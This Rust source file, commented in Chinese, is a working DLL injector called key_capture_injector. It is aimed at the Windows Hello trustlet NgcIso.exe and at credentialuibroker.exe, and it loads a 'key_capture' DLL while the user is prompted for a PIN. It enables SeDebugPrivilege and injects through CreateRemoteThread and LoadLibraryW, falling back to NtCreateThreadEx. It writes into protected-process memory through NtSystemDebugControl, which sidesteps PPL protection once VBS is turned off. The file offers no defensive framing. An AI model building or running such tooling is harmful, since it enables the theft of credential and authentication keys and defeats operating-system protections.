//! DLL 注入器 — 用 CreateRemoteThread + LoadLibraryW 注入 DLL 到目标进程
//!
//! 用法: key_capture_injector.exe <PID|进程名> <DLL路径>
//! 示例: key_capture_injector.exe NgcIso.exe .\key_capture.dll
//!       key_capture_injector.exe credentialuibroker.exe .\key_capture.dll
//!       key_capture_injector.exe 12345 .\key_capture.dll
//!
//! ⚠️ 注入 NgcIso.exe 的前置条件：
//!   NgcIso.exe 是 Session 0 的 PPL（受保护进程轻量级）trustlet，默认状态下
//!   OpenProcess/CreateRemoteThread 会返回 ERROR_ACCESS_DENIED(5)。必须先按
//!   reverse_analysis/WINDBG_RUNBOOK.md 关闭 VBS/核心隔离、开测试签名、并用
//!   剥 PPL 驱动（或内核调试器）解除其保护后，本注入器才能成功。
//!   本程序须以管理员/SYSTEM 运行（SeDebugPrivilege）。

use std::ffi::OsStr;
use std::os::windows::ffi::OsStrExt;
use windows::Win32::Foundation::CloseHandle;
use windows::Win32::Security::{
    AdjustTokenPrivileges, LookupPrivilegeValueW, SE_PRIVILEGE_ENABLED,
    TOKEN_ADJUST_PRIVILEGES, TOKEN_QUERY, TOKEN_PRIVILEGES,
};
use windows::Win32::System::Threading::{
    OpenProcess, CreateRemoteThread, GetCurrentProcess, OpenProcessToken,
    PROCESS_CREATE_THREAD, PROCESS_QUERY_INFORMATION,
    PROCESS_VM_OPERATION, PROCESS_VM_WRITE, PROCESS_VM_READ,
};
use windows::Win32::System::Memory::{
    VirtualAllocEx, VirtualFreeEx,
    MEM_COMMIT, MEM_RELEASE, PAGE_READWRITE, MEM_RESERVE,
};
use windows::Win32::System::Diagnostics::Debug::WriteProcessMemory;
use windows::Win32::System::LibraryLoader::GetModuleHandleW;
use windows::Win32::System::Diagnostics::ToolHelp::{
    CreateToolhelp32Snapshot, Process32FirstW, Process32NextW,
    PROCESSENTRY32W, TH32CS_SNAPPROCESS,
};
use windows_core::PCWSTR;

fn to_wide(s: &str) -> Vec<u16> {
    OsStr::new(s).encode_wide().chain(Some(0)).collect()
}

fn widestr(s: &str) -> Vec<u16> {
    s.encode_utf16().chain(Some(0)).collect()
}

/// 通过进程名查找 PID
fn find_pid_by_name(name: &str) -> Option<u32> {
    let name_lower = name.to_lowercase();
    unsafe {
        let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0).ok()?;
        let mut pe = PROCESSENTRY32W {
            dwSize: std::mem::size_of::<PROCESSENTRY32W>() as u32,
            ..std::mem::zeroed()
        };
        if Process32FirstW(snapshot, &mut pe).is_ok() {
            loop {
                let exe_name = String::from_utf16_lossy(&pe.szExeFile)
                    .trim_end_matches('\0').to_string();
                if exe_name.to_lowercase() == name_lower {
                    let _ = CloseHandle(snapshot);
                    return Some(pe.th32ProcessID);
                }
                if Process32NextW(snapshot, &mut pe).is_err() { break; }
            }
        }
        let _ = CloseHandle(snapshot);
    }
    None
}

/// 启用 SeDebugPrivilege（管理员令牌下）
unsafe fn enable_debug_priv() -> Result<(), String> {
    let mut token = Default::default();
    OpenProcessToken(
        GetCurrentProcess(),
        TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,
        &mut token,
    ).map_err(|e| format!("OpenProcessToken: {e}"))?;

    let mut luid = Default::default();
    let priv_name = widestr("SeDebugPrivilege");
    LookupPrivilegeValueW(None, windows_core::PCWSTR::from_raw(priv_name.as_ptr()), &mut luid)
        .map_err(|e| format!("LookupPrivilegeValue: {e}"))?;

    let mut tp = TOKEN_PRIVILEGES {
        PrivilegeCount: 1,
        Privileges: [windows::Win32::Security::LUID_AND_ATTRIBUTES {
            Luid: luid,
            Attributes: SE_PRIVILEGE_ENABLED,
        }],
    };

    AdjustTokenPrivileges(token, false, Some(&mut tp), 0, None, None)
        .map_err(|e| format!("AdjustTokenPrivileges: {e}"))?;
    let _ = CloseHandle(token);
    println!("SeDebugPrivilege enabled");
    Ok(())
}

/// 注入 DLL 到指定 PID
unsafe fn inject_dll(pid: u32, dll_path: &str) -> Result<(), String> {
    enable_debug_priv().ok(); // 非致命——有更好，没有继续尝试

    println!("Opening process PID={} ...", pid);
    let access = PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION
        | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ;
    let hproc = OpenProcess(access, false, pid)
        .map_err(|e| format!("OpenProcess: {e}"))?;

    let dll_wide = to_wide(dll_path);
    let dll_bytes: &[u8] = std::slice::from_raw_parts(
        dll_wide.as_ptr() as *const u8,
        dll_wide.len() * 2,
    );

    // 在目标进程分配内存
    println!("Allocating {} bytes in target process...", dll_bytes.len());
    let remote_mem = VirtualAllocEx(
        hproc,
        None,
        dll_bytes.len(),
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE,
    );
    if remote_mem.is_null() {
        let _ = CloseHandle(hproc);
        return Err(format!("VirtualAllocEx failed"));
    }

    // 写 DLL 路径 — 先试 WriteProcessMemory，失败则用 NtWriteVirtualMemory
    println!("Writing DLL path to target memory...");
    let write_result = WriteProcessMemory(
        hproc,
        remote_mem,
        dll_bytes.as_ptr() as *const _,
        dll_bytes.len(),
        None,
    );

    if let Err(e) = write_result {
        println!("WriteProcessMemory failed ({e}), trying SysDbgWriteVirtualMemory...");
        // SysDbgWriteVirtualMemory 通过内核调试器写入，可绕过 PPL
        match sysdbg_write(pid, remote_mem, dll_bytes) {
            Ok(()) => {
                println!("SysDbgWriteVirtualMemory succeeded!");
            }
            Err(dbgerr) => {
                println!("SysDbgWriteVirtualMemory failed ({dbgerr}), trying NtWriteVirtualMemory...");
                let nt_status = nt_write_virtual_memory(
                    hproc,
                    remote_mem,
                    dll_bytes.as_ptr() as *const _,
                    dll_bytes.len(),
                );
                if nt_status != 0 {
                    let _ = VirtualFreeEx(hproc, remote_mem, 0, MEM_RELEASE);
                    let _ = CloseHandle(hproc);
                    return Err(format!("All write methods failed. SysDbg: {dbgerr}, Nt: 0x{nt_status:08X}"));
                }
                println!("NtWriteVirtualMemory succeeded!");
            }
        }
    }

    // 获取 kernel32!LoadLibraryW 地址
    let kernel32 = GetModuleHandleW(PCWSTR::from_raw(
        "kernel32.dll\0".encode_utf16().collect::<Vec<u16>>().as_ptr()
    )).map_err(|e| format!("GetModuleHandle: {e}"))?;
    let load_lib: *const std::ffi::c_void = unsafe {
        std::mem::transmute(
            windows::Win32::System::LibraryLoader::GetProcAddress(
                kernel32,
                windows_core::s!("LoadLibraryW"),
            ).ok_or_else(|| "GetProcAddress LoadLibraryW failed".to_string())?
        )
    };

    // CreateRemoteThread — 先尝试标准方式，失败用 NtCreateThreadEx
    println!("Creating remote thread to call LoadLibraryW...");
    let thread = match CreateRemoteThread(
        hproc,
        None,
        0,
        Some(std::mem::transmute(load_lib)),
        Some(remote_mem),
        0,
        None,
    ) {
        Ok(t) => {
            println!("CreateRemoteThread succeeded");
            Some(t)
        }
        Err(e) => {
            println!("CreateRemoteThread failed ({e}), trying NtCreateThreadEx...");
            match nt_create_thread_ex(
                hproc,
                load_lib as usize,
                remote_mem as usize,
            ) {
                Ok(h) => {
                    println!("NtCreateThreadEx succeeded! Thread: 0x{:X}", h.0 as usize);
                    Some(h)
                }
                Err(msg) => {
                    let _ = VirtualFreeEx(hproc, remote_mem, 0, MEM_RELEASE);
                    let _ = CloseHandle(hproc);
                    return Err(msg);
                }
            }
        }
    };

    println!("DLL injected successfully! Thread handle: {:?}", thread);
    println!("Output: C:\\FaceWinUnlock\\captured_keys\\");

    // 等待远程线程完成（WaitForSingleObject）
    if let Some(th) = thread {
        use windows::Win32::System::Threading::WaitForSingleObject;
        let _ = WaitForSingleObject(th, 3000); // 等3秒
        let _ = CloseHandle(th);
    }
    // 不释放 remote_mem —— DLL 可能还在用
    let _ = CloseHandle(hproc);

    Ok(())
}

// ─── NtSystemDebugControl (PPL bypass via kernel debugger) ─────────────
// 内核调试器启用时 (debug=Yes)，SysDbgReadVirtualMemory(17) 和
// SysDbgWriteVirtualMemory(18) 可读写 PPL 保护进程的内存。

const SysDbgReadVirtualMemory: u32 = 17;
const SysDbgWriteVirtualMemory: u32 = 18;

#[repr(C)]
struct SysDbgVirtual {
    pid: usize,     // HANDLE (ProcessId)
    addr: usize,    // PVOID (Address)
    buffer: usize,  // PVOID (Buffer)
    size: u32,      // ULONG (RequestedSize)
}

#[link(name = "ntdll")]
unsafe extern "system" {
    fn NtSystemDebugControl(
        command: u32,
        input: *const SysDbgVirtual,
        input_len: u32,
        output: *mut std::ffi::c_void,
        output_len: u32,
        ret_len: *mut u32,
    ) -> i32; // NTSTATUS
}

unsafe fn sysdbg_read(
    pid: u32,
    addr: *const std::ffi::c_void,
    buf: &mut [u8],
) -> Result<usize, String> {
    let mut sdv = SysDbgVirtual {
        pid: pid as usize,
        addr: addr as usize,
        buffer: buf.as_mut_ptr() as usize,
        size: buf.len() as u32,
    };
    let mut ret_len: u32 = 0;
    let status = NtSystemDebugControl(
        SysDbgReadVirtualMemory,
        &sdv,
        std::mem::size_of::<SysDbgVirtual>() as u32,
        std::ptr::null_mut(),
        0,
        &mut ret_len,
    );
    if status < 0 {
        return Err(format!("SysDbgRead: 0x{status:08X}"));
    }
    Ok(ret_len as usize)
}

unsafe fn sysdbg_write(
    pid: u32,
    addr: *mut std::ffi::c_void,
    data: &[u8],
) -> Result<(), String> {
    let mut sdv = SysDbgVirtual {
        pid: pid as usize,
        addr: addr as usize,
        buffer: data.as_ptr() as usize,
        size: data.len() as u32,
    };
    let mut ret_len: u32 = 0;
    let status = NtSystemDebugControl(
        SysDbgWriteVirtualMemory,
        &sdv,
        std::mem::size_of::<SysDbgVirtual>() as u32,
        std::ptr::null_mut(),
        0,
        &mut ret_len,
    );
    if status < 0 {
        return Err(format!("SysDbgWrite: 0x{status:08X}"));
    }
    Ok(())
}

// ─── NtWriteVirtualMemory (syscall fallback) ──────────────────────────

#[link(name = "ntdll")]
unsafe extern "system" {
    fn NtWriteVirtualMemory(
        ProcessHandle: windows::Win32::Foundation::HANDLE,
        BaseAddress: *mut std::ffi::c_void,
        Buffer: *const std::ffi::c_void,
        NumberOfBytesToWrite: usize,
        NumberOfBytesWritten: *mut usize,
    ) -> i32; // NTSTATUS
}

unsafe fn nt_write_virtual_memory(
    hproc: windows::Win32::Foundation::HANDLE,
    addr: *mut std::ffi::c_void,
    buf: *const std::ffi::c_void,
    len: usize,
) -> i32 {
    let mut written: usize = 0;
    NtWriteVirtualMemory(hproc, addr, buf, len, &mut written)
}

// ─── NtCreateThreadEx (syscall fallback) ──────────────────────────────

#[link(name = "ntdll")]
unsafe extern "system" {
    fn NtCreateThreadEx(
        ThreadHandle: *mut windows::Win32::Foundation::HANDLE,
        DesiredAccess: u32,
        ObjectAttributes: *const std::ffi::c_void,
        ProcessHandle: windows::Win32::Foundation::HANDLE,
        StartAddress: usize,
        Parameter: usize,
        CreateFlags: u32,
        ZeroBits: usize,
        StackSize: usize,
        MaximumStackSize: usize,
        AttributeList: *const std::ffi::c_void,
    ) -> i32;
}

unsafe fn nt_create_thread_ex(
    hproc: windows::Win32::Foundation::HANDLE,
    start_addr: usize,
    param: usize,
) -> Result<windows::Win32::Foundation::HANDLE, String> {
    let mut hthread = windows::Win32::Foundation::HANDLE::default();
    let status: i32 = NtCreateThreadEx(
        &mut hthread,
        0x1FFFFF,   // THREAD_ALL_ACCESS
        std::ptr::null(),
        hproc,
        start_addr,
        param,
        0,          // CREATE_SUSPENDED = 0x00000004, we use 0 (run immediately)
        0,
        0,
        0,
        std::ptr::null(),
    );
    if status < 0 {
        return Err(format!("NtCreateThreadEx failed: 0x{status:08X}"));
    }
    Ok(hthread)
}

fn main() {
    let args: Vec<String> = std::env::args().collect();
    if args.len() < 3 {
        eprintln!("用法: {} <PID|进程名> <DLL路径>", args[0]);
        eprintln!("示例: {} credentialuibroker.exe key_capture.dll", args[0]);
        eprintln!("      {} 12345 key_capture.dll", args[0]);
        std::process::exit(1);
    }

    let target = &args[1];
    let dll_path = &args[2];

    // 验证 DLL 存在
    if !std::path::Path::new(dll_path).exists() {
        eprintln!("DLL 不存在: {}", dll_path);
        std::process::exit(1);
    }

    // 获取绝对路径
    let abs_dll = std::path::absolute(dll_path)
        .unwrap_or_else(|_| std::path::PathBuf::from(dll_path));
    let dll_abs_str = abs_dll.to_string_lossy().to_string();

    // 查找 PID
    let pid = if let Ok(p) = target.parse::<u32>() {
        p
    } else {
        match find_pid_by_name(target) {
            Some(p) => {
                println!("Found {} at PID={}", target, p);
                p
            }
            None => {
                eprintln!("进程未找到: {}. 请先触发 PIN 框使 credentialuibroker.exe 启动。", target);
                std::process::exit(1);
            }
        }
    };

    unsafe {
        if let Err(e) = inject_dll(pid, &dll_abs_str) {
            eprintln!("注入失败: {e}");
            std::process::exit(1);
        }
    }
}
